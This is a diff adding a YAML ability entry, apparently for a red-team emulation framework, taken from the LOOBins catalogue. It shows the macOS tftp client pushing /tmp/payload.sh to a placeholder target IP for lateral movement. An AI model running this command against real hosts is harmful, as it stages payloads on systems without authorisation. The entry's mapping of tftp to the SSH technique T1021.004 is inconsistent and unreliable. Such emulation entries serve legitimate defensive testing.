@@ -1,0 +1,36 @@
+- id: a29a2428-9d17-75aa-4104-e605994fe14e
+  name: tftp - Transfer a file to a target using the tftp client
+  description: The built-in tftp client can push files to a remote TFTP server. The binary mode flag ensures
+    files are not corrupted during transfer.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.004
+    name: 'Remote Services: SSH'
+  platforms:
+    darwin:
+      sh:
+        command: 'tftp <TARGET_IP> << EOF
+
+          binary
+
+          put /tmp/payload.sh payload.sh
+
+          quit
+
+          EOF'
+  singleton: false
+  privilege: User
+  repeatable: true
+  delete_payload: false
+  buckets:
+  - loobins
+  - tftp
+  - lateral-movement
+  version: '1.0'
+  author: LOOBins Project
+  additional_info:
+    loobins_tool: tftp
+    use_case: Transfer a file to a target using the tftp client
+    source_file: tftp.yml
+    source_repository: https://github.com/infosecB/LOOBins
+    import_timestamp: '2026-05-01T05:41:42.599965Z'
